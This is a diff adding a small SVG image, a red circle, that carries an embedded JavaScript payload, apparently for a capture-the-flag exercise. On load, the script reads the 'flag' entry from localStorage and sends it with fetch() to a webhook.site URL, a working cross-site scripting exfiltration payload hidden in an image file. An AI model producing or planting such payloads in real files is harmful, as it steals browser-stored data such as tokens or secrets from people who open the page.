@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+		console.log("SUPER MEGA PAYLOAD")
+		webhook_url = "https://webhook.site/98ee5556-aed4-45da-aac9-f971e45ab05c/?flag="
+		fetch(`${webhook_url}${localStorage.getItem("flag")}`)
+  </script>
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+</svg>
